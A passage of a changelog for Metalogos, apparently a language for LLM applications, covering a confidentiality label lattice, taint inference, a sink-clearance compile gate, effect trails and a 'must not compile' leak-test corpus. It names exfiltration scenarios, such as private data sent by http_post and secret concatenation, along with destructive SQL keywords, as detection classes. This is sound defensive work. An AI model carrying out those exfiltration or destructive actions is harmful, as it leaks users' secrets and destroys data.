- **Category-A gate `SINK_CLEARANCE`** (`src/audit.rs`, wired last into `audit_category_a` so pre-existing specialized checks keep their classes): at every sink-builtin call site the argument's inferred label (№322 annotations + №323 flow inference + №325 literal markers) must clear the sink — default clearance `public`; `poisoned` clears no sink (ADR-0154 §2.1). **The sink list is the №316 SSOT classification** (`Role::Sink`) — never a hand-written list (pinned by test).
- **specialized classes** (the leak-suite vocabulary): `PII_EGRESS_OUTPUT`, `PII_EGRESS_NETWORK`, `SECRET_EGRESS_NETWORK` (private-infrastructure destination marker in the address position), `SECRET_EGRESS_VCS`, `SECRET_TO_EXEC`, `UNTRUSTED_EXEC_DECISION`, `UNTRUSTED_EGRESS_NETWORK`, `VOICE_EGRESS_UNCONSENTED` (consent sources are Phase 2 №335 — until then voice egress is unconsented by default, loud by design), `IRREVERSIBLE_NO_GRANT` (destructive SQL literals: DROP/DELETE/TRUNCATE/ALTER — the grant algebra is Phase 3 №339), plus the inherited classes for shared sites: `TAINT_PERSISTENCE` (memory writes), `HTML_INJECTION` (untrusted → public output), `SECRET_LEAK` (private → file sink), and the generic `SINK_CLEARANCE`.
- **literal confidentiality markers** (ADR-0161 §3, `semantic.rs`): string literals carrying personal-data markers (passport/SNILS/diagnosis/confidential wording — a small bilingual vocabulary + structural RU-passport/SNILS digit shapes) or private-infrastructure URL markers (`internal`/`intranet`/`corp.`/`private`/`secret`) are seeded `private, trusted`; entity initializers seed the same way. Sound by conservatism: no markers → bottom → zero delta for plain programs (pinned by test).
- **`profile legacy { egress: permissive_with_audit }`** (ADR-0161, absorbs №314 v1): a program-level compatibility profile — the gate runs ADVISORY: compilation and execution stay green (Severity::Info is not promoted by №98) and every hit is recorded as an audit event (`[SINK_CLEARANCE][audit-event]` stderr line + Severity::Info finding in `mlog audit`). `legacy` is a migration bridge, not a residence — the burn-down metric is the event count (ADR-0161 §3). New `Declaration::Profile` + `src/profile.rs` (mode resolution + loud validation of unknown profile names/options) + grammar `profile_decl`/`profile_option`/`PROFILE_KW` (313 → 316 rules, additive).
- **leak-suite → strict**: `tests/run_leak_suite.rs` BLOCKING = true — **28 caught / 0 not caught / 0 mismatches**: every negative scenario fails compilation with its expected class, every positive keeps compiling and running. The two pre-lattice demos that intentionally relay request data into outputs (`p7_json_body`, `p8_route_patterns`) declare `profile legacy` — the honest migration path; the honest strict-mode breakage list is exactly those two.
- **tests**: `tests/naryad_325_sink_clearance.rs` (16): the red/green scenario (`http_post(url, private_data)` fails strict, compiles with audit events under legacy), classification-backed sink list, all specialized classes, poisoned clears nothing, redact-before-sink passes, zero delta for plain programs, loud unknown profile words, an independent recomputation of the corpus closure, no-stub grep.
- **boundaries (loud)**: media sinks Phase 2 (№331+); runtime twin of the gate №328; consent sources Phase 2 (№335); the general integrity gate №327; per-call escape policies revisited after Phase 2. No `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — feature/labels: ADR-0154 — label lattice (conf, integrity, consent-scope) + label carrier + annotation syntax (Naryad #322, P0/feature/labels, issue #416)

### Added — feature/labels: effect trail in pattern signatures ⟨io, audit⟩ (Naryad #324, P0/feature/labels, issue #418)

- **syntax** (`src/grammar.pest`, +2 rules — 311 → 313, strictly additive: a `⟨` after a return type was previously a parse error): `pattern P(x: String) -> String ⟨io, audit⟩ { ... }` — the declared effect trail sits after the return type on patterns, tool methods, and learnable patterns. Shape-only grammar (comma list of bare words; `⟨⟩` = the zero-effect contract); semantic validates the WORDS — the closed set `{io, audit}` — with the trail's span (same grammar-shape/semantic-words division of labor as №322).
- **AST** (`src/ast.rs`): `Effect { Io, Audit }` (closed set), `EffectSet` (BTreeSet — canonical `⟨io, audit⟩` display), `EffectAnn { span, raw }`; `effects: Option<EffectAnn>` on `PatternDecl` / `ToolMethod` / `LearnablePatternDecl`.
- **the gate** (`src/semantic.rs::check_effect_trails`): every DECLARED trail is held against the FACTUAL body effects — factual ⊑ declared, excess = loud compile error listing declared / required / excess, caught at the calling boundary. Interface semantics: a call to an annotated pattern contributes its DECLARED contract; a call to an unannotated pattern contributes its inferred effects. Patterns without a trail are ungated — zero behavioral delta for existing programs (pinned by test).
- **factual effects via the №316 SSOT** (no name re-hardcoding): `Source` builtins → `io`; `Sink` builtins → `io`, plus `audit` when the reversibility is not pure (state/db/file/memory writes, delivery); `Pure`/`Lift` → ∅; the `memorize`/`forget`/`relate` statements → `io, audit`; a learnable pattern is an LLM call — `{io}` by construction.
- **recursion decision (ADR-0154 §9.3)**: the effect domain is the 4-element powerset of `{io, audit}`; unions are monotone; the interprocedural fixpoint CONVERGES on directly and mutually recursive patterns without annotations (≤ 4 passes) — the dispatcher's No-Go signal does not fire; an explicit trail on a recursive pattern is welcome but not required and is gated against the same fixpoint result.
- **showcase** `examples/l1_effect_sig.mlog`: `Fetch ⟨io⟩` (env), `Log ⟨io, audit⟩` (memorize), `Run ⟨io, audit⟩` (declared contracts compose) — compiles clean; the exceeding-call compile error is pinned by tests.
- **tests**: `tests/naryad_324_effect_trail.rs` (18): syntax on all three carriers (span, bare type name), empty trail, unknown/duplicate words loud, the gate (excess list, calling-boundary attribution, undeclared callee shares factual effects), legal composition, zero delta without trails, the №316 mapping (env → io; print → io+audit; upper → ∅), memory statements → audit, direct + mutual recursion convergence, gated recursion, the showcase example, canonical display, no-stub grep.
- **boundaries (loud)**: grant effects (action-grant algebra) are Phase 3 (№339); polymorphic effects deferred; runtime parity of trails is №328. No `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — feature/labels: ADR-0154 — label lattice (conf, integrity, consent-scope) + label carrier + annotation syntax (Naryad #322, P0/feature/labels, issue #416)

### Added — feature/labels: statement-level label inference — 10/10 statement kinds, joins at merge points (Naryad #323, P0/feature/labels, issue #417)

- **inference engine** (`src/semantic.rs`, `infer_pattern_labels` / `LabelInference`): static propagation of `(conf, integrity, consent-scope)` labels through pattern bodies with per-statement contracts (ADR-0154 Appendix A). Sources reuse the audit.rs vocabulary projected through the ADR-0154 §5 table (`env`/`secret` → private, `call_llm`/`call_claude`/`call_llm_schema`/`reflex_generate` → public/untrusted, `form_data`/`json_body`/`query_param`/`mcp_call` → public/untrusted, `render`/`escape_html` → trusted, `redact(x, "secrets"|"all")` → private → public, never curing `poisoned`).
- **joins at merge points — componentwise**: if/else-if/else (every branch inferred from the entry env; one-sided assignment conservative by construction), match arms (+ else), loop exits (each/while).
- **while — bounded fixpoint** (the decision the naryad demanded, recorded in Appendix A): body re-inferred until the environment stabilizes, cap 8 passes (conf-lattice height 4, monotone joins → the bounded fixpoint IS the exact fixpoint; the cap is a termination guard). A single conservative pass would under-approximate loop-carried chains (`a = b; b = env(...)` needs pass 2) — unsound on a security lattice.
- **per-kind rules**: LetBinding/Assign — RHS label (Assign replaces, mirroring TaintTracker untaint); Each — iterator = iterable label, body cannot raise it, exit = join; EachWithIndex — index stays bottom (a position, not data); Return/ExprStmt — result joins the pattern output; Match — arms join + the scrutinee's label joins every variable structurally assigned in any arm (control dependence; structural detection, not label-diff — a branch can assign the same label it inherited); Break/Continue — no-op; Memorize/Forget/Relate — memory side effects, persistence gating is №325.
- **example** `examples/l1_flow_infer.mlog` (+ golden .expected): the private label from env() reaches the output through if/else + each WITHOUT a single annotation; the runtime takes the public branch so the program runs clean. Asserted by the test reading the file and running the inference.
- **tests**: `tests/naryad_323_flow_infer.rs` (16): example purity (no annotations) + private arrival; all 10 mandatory kinds + redact bridge (private down, poisoned NOT curable — ADR-0136 D2); no-stub markers on the naryad's new files.
- **docs**: ADR-0154 Appendix A (contracts table + while decision + boundaries: recursion → №324, polymorphism deferred, media handles Phase 2, learnable-call sources need the №325 program context); REFERENCE §2.2 (user-facing table).
- Boundaries (loud): no new diagnostics in this naryad — the inference is the read-only machinery №325's sink-gate consumes.

### Added — feature/labels: ADR-0154 — label lattice (conf, integrity, consent-scope) + label carrier + annotation syntax (Naryad #322, P0/feature/labels, issue #416)

- **ADR-0154 filled** (`docs/adr/0154-label-lattice.md`, reserved → Accepted): three-component label model — conf axis `public < consented < private < poisoned` where `poisoned` is quarantine and absorbing for BOTH join and meet (a curable meet would be a one-step declassifier); integrity axis `untrusted < trusted` dual to conf (join = min, meet = max — DLM/Jif, FlowCaml, LIO); consent-scope axis = set of consent scopes (join = intersection, meet = union). join/meet are componentwise. Rejected alternatives recorded: single numeric lattice; dimensions without meet; curable quarantine; restrictive-side silent defaults.
- **new module `src/labels.rs`**: `Conf`, `Integrity`, `ConsentScope`, `Label` (join/meet/bottom, canonical Display `private, untrusted, consent(gdpr)`), `Label::parse` (conf word REQUIRED — a bare `<untrusted>` cannot silently mean `public`; integrity defaults `trusted`; consent defaults empty — defaults only on the permissive side), and `legacy_taint_label` — the additive ADR-0154 §5 projection table from the five legacy `TaintKind`s (LlmOutput→public/untrusted, Secret→private/trusted, UserInput→public/untrusted, Sanitized→public/trusted, CanaryLeak→poisoned/quarantine). No kind removed, no Category-A check touched, zero message diffs; exhaustiveness pinned by a unit test in `src/audit.rs` (enum ↔ table drift fails CI).
- **annotation syntax** (strictly additive grammar rules, +6): `String<private>`, `String<private, untrusted, consent(gdpr, analytics)>` on pattern/learnable/template/tool-method params, entity-type fields, and entity record/simple type positions — everywhere else a `<...>` after a type remains a parse error. Division of labor: grammar guarantees the SHAPE (word/consent-part list), semantic validates the WORDS via `Label::parse` — the word table stays in one place and the semantic validation is reachable, not dead code.
- **label carrier** (`src/ast.rs`): `LabelAnn { span, raw }` on `Param`, `FieldDecl`, `EntityRecordDecl`, `EntitySimpleDecl` — `type_name` stays the bare type; the annotation carries its source span.
- **semantic validation** (`src/semantic.rs`): unknown word / duplicate conf / duplicate integrity / duplicate consent / missing conf / empty consent list are loud errors with the annotation's span, in the existing diagnostic style (`label annotation '<private, bogus>' on parameter 's' of pattern 'p': unknown label word 'bogus'`).
- **tests**: `tests/naryad_322_labels.rs` (11: carrier + span, three-component parse, both entity forms, no-annotation programs unchanged, join/meet componentwise + poisoned absorbing both operations, semantic loudness incl. span line, projection totality, no-stub grep) + `src/labels.rs` unit tests (14) + audit.rs projection test. README parser-rules counter 305 → 311 (caught by readme_consistency).
- **boundaries (loud)**: statement-level inference is №323, effect-trail №324, sink-gate + `profile legacy` №325 (reads the §5 table), consent sources (ledger ↔ lattice wiring) Phase 2 №335; parametric label polymorphism deferred. No `todo!`/`unimplemented!`/`SKELETON` (asserted by test).

### Added — docs: doc-sync + ADR booking 0154–0161 (Naryad #319, P0/docs, issue #406)

- **REFERENCE.md header synced with README/Cargo**: version 0.17.0 → 0.19.0; added a "Synced with code" line (2026-09-14, naryad №319) carrying code-derived counters: 421 builtins, 153 ADR files (145 accepted + 8 reserved). Video/voice builtin rows re-verified against the registry (`video_render` 2..4, `video_export` 2, `video_extend` 2; 18 voice/audio rows incl. the recorded `*_stub` loud-No-Go boundaries per ADR-0145) — REFERENCE remains 421/421 (coverage test green).
- **ADR booking 0154–0161** (honest `reserved` stubs, one-line theme + plan v2 §19 reference, zero fake content): 0154 label lattice (№322), 0155 grant algebra (№339), 0156 TW/VM/JIT parity (№328), 0157 ledger profile PROV/in-toto (№343), 0158 declassify boundaries (№326), 0159 sim-first/STL (№354), 0160 identifier naming convention (filler unassigned), 0161 legacy compat profile (№325). **Collision divergence documented**: the issue's block 0151–0158 was already partially taken (0151–0153 by №309/№320/№412 between the plan snapshot and this booking) — the booking shifted +3, recorded in every stub, in the ADR index, and here.
- **docs/adr/README.md**: numbering-rule line updated (accepted max 0153, overall max 0161 reserved); new "Reserved for plan v2 §19" booking table; index regenerated (153 entries).
- **README**: ADR counter 145 → 153 (with the accepted/reserved split stated inline); REFERENCE size claim 214 → 215 KB.
- **Name-canon (plan v2 §15) — zero-scope finding**: `WALL-OSS-0.5`, `MolmoAct2`, `Nemotron-3-Nano-Omni-30B-A3B` do not occur anywhere in the repository (verified by case-insensitive whole-repo grep, all file types). Nothing to unify; the canon applies when plan v2 lands or these models first appear in wedge/research docs.

### Added — docs: REALITY.md — plan-v2 asset fact-check + honest P0-readiness estimate (Naryad #318, P0/docs, issue #405)

- **`docs/REALITY.md`** — new SSOT page: per-anchor verdicts (CONFIRMED / PARTIAL / PHANTOM) for all 13 asset claims of §2 plan v2, each with a proof command and its actual output, reproducible on the plan snapshot `fc59e9e` via `git show` (no checkout needed). Verdicts: 9 CONFIRMED, 3 PARTIAL, 1 PHANTOM — «84 VM instructions» is PHANTOM (real count 47, second-method-verified; README's own claim already said 47), «10 Statement kinds» is PARTIAL (real count 15; README's stale "12" truth-uped), «143 ADR» is PARTIAL (142 ADR files + index README on the snapshot; canonical counter excludes the index).
- **taint-effect boundaries** — the six "not ready" items from plan §2 proven absent by command on `1876fdf`: no lattice (0 `lattice` hits), statement-kind inference covers 9/15 kinds in `TAINT_INTERP` (Match/Break/Continue: 0 hits), no join/widen (canary fork is a clone without merge), no effect traces (`effect` in audit.rs: 0), no central exhaustive match over `TaintKind`, no affinity. Each item is pinned to the audit.rs location where it must appear.
- **working P0-readiness estimate: 26%** — weighted decomposition (labels 30%×55% = 16.5pp, capability 20%×0%, backend registry 15%×10% = 1.5pp, ledger 15%×35% = 5.25pp, memory 20%×13% = 2.6pp; total 25.85 ≈ 26%), inside the ~25% ± 5pp corridor demanded by the issue. Weights are marked UNVERIFIED (plan v2 is not in the repo — proven by `git ls-tree`); per-subsystem readiness rests only on code facts. Divergence from v1 "~60%" documented with five reasons (width ≠ readiness, invisible empty subsystems, advisory ≠ gate, width-without-readiness indicators, taint-engine boundaries).
- **precedent-asset index** — ADR-0114 (opaque handle → capability), ADR-0125/№241 (Category-A gates), ADR-0136/№274 (sanitizer taint semantics), №284 (path-sensitive fork → future join), №261/№130 (layered network gate), №300 (consent gate over ledger) — each with what it contributes as a template.
- **README truth-ups found by the fact-check**: Architecture diagram "29 Declaration / 15 Expr / 12 Statement" → 33/14/15, AST table "12 Statement" → 15, component table "46 VM instructions" → 47 (all counters uncovered by consistency tests — now match the verified counts); REALITY.md linked next to Known Limitations.

### Added — tests: LEAK-SUITE — corpus of "must not compile" contracts + reporting runner (Naryad #317, P0/tests, issue #404)

- **corpus**: `examples/leak/` — 28 negative programs (`n*.mlog` + `n*.error` with `EXPECTED: <CLASS> — <scenario>`) + 16 positive legal flows (`ok_*.mlog` + calibrated `.expected`). Mandatory scenarios covered: private text to http_post, unconsented voice to cloud (tts_send), http_get→exec prompt-injection, print(secret) class, irreversible db_execute without grant, unmarked synthetic egress (vision_export_raw), untrusted frame taint, secret concat exfiltration; necessary-negatives (redact-before-sink, local journal for private) are positives that must keep passing after №325.
- **class vocabulary** (SSOT in the runner header): existing audit check_ids (SECRET_LEAK, HTML_INJECTION, UNTRUSTED_FRAME, MEDIA_SYNTHETIC_UNMARKED, SQL_DYNAMIC) + planned №325 lattice classes (PII_EGRESS_NETWORK/OUTPUT, VOICE_EGRESS_UNCONSENTED, UNTRUSTED_EXEC_DECISION, SECRET_TO_EXEC, IRREVERSIBLE_NO_GRANT, SECRET_EGRESS_VCS/NETWORK, UNTRUSTED_EGRESS_NETWORK, TAINT_PERSISTENCE).
- **runner**: `tests/run_leak_suite.rs` — separate from the main golden cycle (examples/leak/ is a subdirectory; golden.rs scans non-recursively). Compiles every negative, compares the CLASS of the failure (a foreign reason = corpus integrity violation = fail), runs positives against `.expected`. Reporting (non-blocking) until №325 — `BLOCKING: bool` one-attribute switch flips it blocking. Measured today: **11/28 caught (39%), 17 documented holes, 0 mismatches** — the hole is now measured, not invisible.
- **calibration tooling**: `#[ignore]`d `leak_corpus_calibration_dump` prints actual failure classes (`cargo test --test run_leak_suite leak_corpus_calibration_dump -- --ignored --nocapture`).

### Changed — video: VIDEO-TEXT-PATH — DiT text conditioning wired, no-stubs re-audit (owner directive 2026-09-14, ADR-0153)

- **text path is real**: `VideoDit::forward` no longer drops the prompt embedding (`_text` dead parameter removed) — the embedding is loudly shape-validated (`[B, text_dim]`), projected by a seeded `Linear(text_dim → hidden_dim)` (streams seed+20/+21, no overlap) and broadcast-added to every token at each denoising step. Prompt conditioning now operates through TWO real paths: seed derivation AND the projected embedding (ADR-0153 D1).
- **boundary restated** (ADR-0153 D2): the embedding remains hash-derived (`hash_embedding(seed)`), NOT a learned text encoder — umT5-class encoders stay under the №294-class No-Go with `video_fetch_weights` as the loud error; `docs/limitations.md` carries the row.
- **no-stubs re-audit** (ADR-0153 D4): "stub" wording reserved for recorded loud-error boundaries; test fixture comment in `sampler.rs` relabeled (zeros are a valid input of the real path); №307 historical note in `src/video/mod.rs` marked superseded by №309. Zero `unimplemented!()`/`todo!()`/hidden stubs in the pillar.
- **tests**: text conditioning changes the velocity field; same text → identical output; shape mismatch is a loud error (width and batch); `hash_embedding` seed-sensitivity. No absolute video hashes pinned anywhere — determinism contracts (two-anchor exactness, endpoint preservation, byte-deterministic mux/export) unaffected by construction.

### Added — feature: MCP_SERVER — Metalogos as MCP server (tool constructs → MCP tools via stdio) (Naryad #297, P1/feature/mcp)

- **new module**: `src/mcp_server.rs` — stdio-based JSON-RPC 2.0 server (newline-framed) that exposes user `tool` constructs from a .mlog file as MCP tools. Reverse of MCP client (Naryad #268, ADR-0132) — Metalogos IS the tool server.
- **CLI**: `mlog mcp-serve app.mlog --allowlist tool1,tool2` — fail-closed: without --allowlist, server refuses to start.
- **protocol**: MCP over stdio — `initialize` → capabilities (tools); `tools/list` → array of tool schemas (name/description/inputSchema from ToolDecl); `tools/call` → execute tool method body in TW runtime, return result.
- **allowlist**: explicit tool names (format: `tool_name.method_name` or bare `method_name`); absent → loud error. Fail-closed — no tools exposed by default.
- **execution**: tool method body executed via Interpreter::eval_statements with JSON args → Value env; existing gates (exec/env — №253/№259) apply. Max response size 1MB before truncation.
- **JSON-RPC framing**: newline-delimited (one message per line), consistent with client №268.
- **errors**: JSON-RPC error codes (parse error -32700, method not found -32601, invalid params -32602). No silent failures.
- **no HTTP/SSE transport** (Future in ADR-0132 — separately). No changes to client №268.


### Added — security: TAINT_DEPTH — bounded nesting depth 3 + README/threat-model truth-up (Naryad #295, P1/security)

- **nesting depth**: `expr_is_llm_tainted` was single-level (caught `respond(call_llm(...))` but NOT `respond(upper(call_llm(...)))`). Now bounded-recursive up to `TAINT_NESTING_MAX_DEPTH = 3` — catches depth 2 (`respond(upper(call_llm(...)))`) and depth 3 (`respond(upper(upper(call_llm(...))))`); depth 5 (call_llm at depth 4) is the documented boundary (not caught intraprocedurally; `TAINT_INTERP` catches if a pattern call is involved).
- **sanitizers at any depth**: `render()`/`escape_html()` wrapping the LLM source at any depth return false (taint lifted) — zero false positives on legitimate code. Test contract (c) verified.
- **BinaryOp/IfElse/List/FieldAccess/IndexAccess propagation**: bounded-recursive check now propagates through compound expressions (not just FnCall chains). Test: `respond("prefix: " + call_llm(...))` → HTML_INJECTION (BinaryOp arm).
- **reflex_generate** (Naryad #201): LLM-output-equivalent source — `is_llm_source("reflex_generate")` returns true regardless of feature gates (static audit, not runtime-gated). Test: `respond(upper(reflex_generate(...)))` → HTML_INJECTION.
- **persistence truth-up** (no code change — README/threat-model only): `TAINT_PERSISTENCE` check (naryads #141/#157) catches LLM output stored via `memorize()` and read back via `recall()` reaching `respond()` — **at file/module scope** (any scope with `recall + respond` AND any `memorize` with LLM source anywhere in declarations). The previous README row "Data flow through persistence is not tracked" was misleading — the check EXISTS, it's just bounded to file scope, not cross-module data-flow. README row rewritten.
- **`query(format(...))` truth-up** (no code change): `check_sql_dynamic` (Naryad #78) **loudly rejects** any non-literal in the 1st argument of `query()`/`db_execute()` — including `format(...)` (`Expr::FnCall`, not `Expr::StringLit`). Test: `tests/check_integration.rs:71-90` "non-literal SQL must be a compile-time error". The previous README row "not detected" was wrong — it IS detected and loudly rejected. README row removed; threat-model entry rewritten as "NOT a gap".
- **README "Known boundaries"** truth-up:
  * Removed: "LLM output stored via `memorize()` then read back via `recall()` — Data flow through persistence is not tracked" (misleading — check exists since №141, bounded to file scope).
  * Removed: "`query(format("...", x))` — `format()` output is not a literal string; check requires compile-time constant" (wrong — check_sql_dynamic rejects ALL non-literals, including format).
  * Added: "LLM output nested deeper than 3 levels of non-pattern function calls — `expr_is_llm_tainted` is bounded (naryad #295); `TAINT_INTERP` catches via summary if a pattern call is involved".
  * Updated intro: "bounded to nesting depth `TAINT_NESTING_MAX_DEPTH = 3` (naryad #295)".
- **docs/threat-model.md "Known Boundaries"** truth-up: persistence entry rewritten (file-scope check exists); `query(format(...))` entry rewritten as "NOT a gap"; nesting entry added.
- **tests** (`tests/naryad_295_taint_depth.rs`, 8 tests, all green):
  * (a) depth 2 — `respond(upper(call_llm(...)))` → HTML_INJECTION.
  * (b) depth 3 — `respond(upper(upper(call_llm(...))))` → HTML_INJECTION.
  * (c) render/escape_html at depth 2 → NOT flagged.
  * (d) depth 5 (call_llm at depth 4) → NOT flagged (documented boundary).
  * Additional: depth 1 no regression; BinaryOp with LLM operand; reflex_generate at depth 2.
- **no changes** to `check_sql_dynamic` (contract: it's correct; only documentation truth-up).
- **no changes** to existing check_id semantics.

### Added — feature: VISION_REALW — formal No-Go, the real-weights run remains PARKED (Naryad #294, P0/feature)

- **verdict**: **No-Go** — executing the №237 runbook is impossible in the current environment; the hardware gate is not passed. Date: 2026-09-14.
- **preflight check** (the agent container): 4.1 GB RAM (64 GB needed), 9.9 GB disk (40 GB needed; 32.85 GB for the weights alone), no GPU. 3 of 3 hardware requirements NOT passed.
- **owner decision 2026-09-14** (issue #357 body): "conditional Go — if a machine is allocated per the preflight, the №237 runbook is executed verbatim; without a machine — a formal No-Go with an explicit revisit date. The audit 'Tiny model' option is rejected." In the agent container there is no machine → a formal No-Go.
- **revisit date**: when hardware is allocated (≥64 GB RAM, ≥40 GB disk, a GPU contour). Open item outside the repo — the owner's decision on allocation.
- **report**: `docs/research/naryad-294-vision-realw-no-go.md` — the formal No-Go with the preflight table, the reasons, what was NOT done (because it is impossible), and what is available without hardware.
- **Parked status remains** (No-Go → not lifted). Updated in three places:
  * `docs/adr/0122-vision-pillar-scope.md` map row #237 — the №294 No-Go verdict + revisit date + report link added.
  * `README.md` "Weights run parked" — the №294 No-Go verdict + report link added.
  * `docs/threat-model.md` — unchanged (did not mention PARKED directly; the vision pillar was covered via README + ADR-0122).
- **zero diff in `src/**`** — the vision pillar code is GO-ready after №236/№243; the №212/№243 env-gated tests SKIP loudly when `MLOG_VISION_WEIGHTS_DIR` is unset (working behavior, not a blocker). The real problem is hardware, not code.

### Added — adr: ADR-0141 — VM production-readiness: staged gap closure + parity-gated default flip (Naryad #293, P0/adr)

- **ADR-only, no code** (a P0/adr research naryad, issue #356 — VM_COMPLETE). Source: the external Metalogos audit of 2026-09-13. **Owner decision 2026-09-14**: supersede ADR-0105's "Do not implement…" caveat — staged gap closure; the default flip (ADR-0088) remains behind the gates: parity 100% + full crosscheck + soak + real load.
- **research**: `docs/research/vm-gaps-inventory.md` — a gap inventory with numbers:
  * **Explicit gaps (compiler.rs)**: 2 — `Match` statement (compiler.rs:1373), `Expr::BlockIfElse` (compiler.rs:902).
  * **TW-only**: `match_expr` (Naryad #173b) — closed automatically once Match-as-expression is implemented in Stage 1.
  * **Hidden gaps (crosscheck exclusions)**: 3 — binop coercion (heterogeneous List+String, p118_collection_utils.mlog), PRNG state (reflex_math.mlog), Bool→String formatting ("true" vs "1").
  * **Closure cost**: ~745 LOC across ~4 naryads (№294-№297), per the №91 precedent (TryEval) — instruction + compiler + VM dispatch + tests + crosscheck exclusion removal.
- **ADR-0141 staged plan** (D1-D7):
  * **Stage 0** (this naryad — №293): research + ADR + a README update. Zero code.
  * **Stage 1** (naryads #294-#297): closing the 4 gaps per the №91 precedent. Each — a separate naryad, a separate PR, separate tests + crosscheck exclusion removal.
  * **Stage 2**: parity gate — `tests/crosscheck_backends.rs` without VM-uncovered exclusions (except the negative-test contracts).
  * **Stage 3**: soak — FOSVED on the VM in staging for 1 sprint (≈2 weeks), without panic/regression.
  * **Stage 4**: real-load benchmark — a representative FOSVED workload (≥2000 lines, with LLM/DB/vision). The VM must show a ≥2× latency improvement OR equivalent latency with a memory/CPU win.
  * **Stage 5** (only if Stages 2-4 are green): the ADR-0088 default flip `interpreter` → `vm`. A separate ADR (a new number — `0142` or higher). The `METALOGOS_SERVE_BACKEND=interpreter` opt-out preserved for back-compat.
  * **D7**: ADR-0105 §Decision 1-4 remain in force (TW = the guaranteed full-language backend; VM = experimental until Stage 5). The "Do not implement Match/BlockIfElse in the VM under this ADR" caveat — superseded.
- **README**: the Dual Execution Backend section updated — a link to ADR-0141 + the staged closure plan; ADR count 132→133.
- **docs/adr/README.md**: index regenerated (133 entries); max statement updated (0140→0141).
- **this ADR does NOT**: close the gaps (Stage 1 — naryads #294-#297); change the backend default (Stage 5 — a separate ADR after Stage 2-4); remove ADR-0105 (only the caveat is superseded).

### Added — security: TAINT_INTERP — interprocedural taint MVP, summary-based, bounded depth 2 (Naryad #292, P0/security)

- **new check_id**: `TAINT_INTERP` (Severity: Error, Category A — promoted to compile error via `audit_category_a` → semantic №98). Catches the case `TAINT_PASSTHROUGH` (Naryad #141/#157) misses: non-trivial patterns where `return <param>` is wrapped in another expression (e.g. `return upper(x)`) or chains through 2 user-pattern calls (`respond(Outer(Inner(call_llm(...))))`).
- **new check_id**: `INTERP_DEPTH_LIMIT` (Severity: Warning, advisory-only in `audit_program` — NOT promoted to compile error). Emitted when a pattern participates in a call cycle (recursion / mutual recursion); analysis terminates cleanly at `TAINT_INTERP_MAX_DEPTH = 2`. The boundary is documented loudly, not silently.
- **approach** (summary-based interprocedural taint):
  * `compute_pattern_summaries(decls)` — for each `pattern`, computes `PatternSummary { params_tainting_return: HashSet<param_index>, bounded_recursion: bool }`.
  * `propagate_params(pattern_name, pattern_bodies, pattern_names, propagated, visited, depth)` — bounded depth 2; cycle detection via `visited` set; `bounded_recursion` flag set on every pattern in a cycle.
  * `check_taint_interp_pattern` — for each sink call (`respond`/`respond_html`/`write_file`/`print`), check if any arg is a user-pattern call whose summary says some param taints the return, and that param's corresponding arg-expression contains an LLM source (directly or through 1-2 levels of pattern calls).
- **sanitizers take precedence** (zero false positives on legitimate code, test contract (c)): `render()`/`escape_html()` wrapping the LLM source lift the taint — `respond(render(...))` and `respond(escape_html(...))` are NOT flagged.
- **wiring**: `check_taint_interp_pattern` is called from `audit_program` (full version, with `INTERP_DEPTH_LIMIT` warnings) and `check_taint_interp_pattern_errors_only` from `audit_category_a` (Errors only, drops the `INTERP_DEPTH_LIMIT` advisory Warnings — mirrors `check_vision_export_gates_errors_only` discipline from Naryad #241).
- **tests** (`tests/naryad_292_taint_interp.rs`, 10 tests, all green):
  * (a) `pattern Wrap(x) { return upper(x) }` + `respond(Wrap(call_llm(...)))` → `TAINT_INTERP` (today `TAINT_PASSTHROUGH` misses — non-trivial body).
  * (b) 2-level chain `respond(Outer(Inner(call_llm(...))))` → `TAINT_INTERP`.
  * (c) Legitimate path through `render(...)`/`escape_html(...)` → NOT flagged (zero false positives); `render` wrapping pattern call also lifts taint.
  * (d) Recursive pattern `Recurse(x) { return Recurse(x) }` → `INTERP_DEPTH_LIMIT` warning (analysis terminated, not hung).
  * Additional: trivial 1-param passthrough (`return x`) still caught by `TAINT_PASSTHROUGH` (not duplicated); pattern not returning its param (`return "constant"`) → no taint flow (correct negative); `respond_html` and `write_file` sinks also trigger `TAINT_INTERP` with non-trivial wrap.
- **docs**:
  * README "Known boundaries of static analysis" — `TAINT_INTERP` row added (Error), `INTERP_DEPTH_LIMIT` row added (Warning); "Interprocedural taint deeper than 2 levels" replaces "Taint does not cross pattern boundaries" (now caught at depth ≤2).
  * `docs/threat-model.md` — `TAINT_INTERP` row added to audit table; "Interprocedural taint" Known Boundaries entry rewritten to reflect bounded depth-2 tracking (was: "LLM output passed through a non-trivial pattern call chain" — now: "deeper than 2 levels").
- **no changes** to `grammar.pest`/compiler (contract: MVP — pure inference, no `taint`/`sanitized` annotations on signatures — that's a separate naryad after an ADR).
- **no changes** to existing `TAINT_PASSTHROUGH` semantics — trivial 1-param passthrough still caught by the original check.

### Added — docs: llms.txt — an index for agent tooling and RAG pipelines (Naryad #291, P3/docs)

- **artifact**: `llms.txt` (new) — a plain markdown index at the repository root, following the `llmstxt.org` v2 format (H1 title, optional blockquote description, bullet list of canonical files). 14 working relative links to the key files: AGENTS.md/CLAUDE.md/GEMINI.md (methodology), REFERENCE.md (the full reference), src/grammar.pest (the PEG grammar), tree-sitter-mlog/grammar.js (the parallel tree-sitter grammar), examples/ (214 working .mlog files), README.md, CHANGELOG.md, docs/adr/ (132 ADRs), docs/threat-model.md, FEATURE_INTAKE.md, AI_USAGE.md, MEMORY_ROADMAP.md.
- **Block 2 — an honest statement of expectations**: the file itself states it explicitly — "an index for IDE agents and RAG pipelines that were explicitly pointed at this repository's URLs. Not for automatic discovery — the major crawlers (GPTBot, ClaudeBot, Google-Extended) practically never request llms.txt systematically." No claim that "agents will automatically find the language through this file" — the source document showed the limitation outright.
- **README**: 1 line added to Project Structure (`llms.txt` with a description).
- **not created**: `llms-full.txt` (the extended variant) — not enough value claimed, only the basic index (the naryad contract).
- **ADR**: not required (`ADR-0110` §1: an established pattern, not new semantics).
- **contract fulfilled**: the file exists and follows the `llmstxt.org` v2 format (markdown, not an invented structure); all 14 internal links are working relative paths (verified with `ls -e`).

### Changed — docs: AGENT.md → AGENTS.md — canonicalization to the industry standard (Naryad #290, P2/docs)

- **Block 1 — renaming**: `AGENT.md` → `AGENTS.md` (`git mv`, history preserved). `AGENTS.md` is a real, widely adopted industry standard (`agentsmd/agents.md`, 24266★, stewarded by AAIF under the Linux Foundation since December 2025). The former `AGENT.md` (165 lines) was correct in content and needed only the rename.
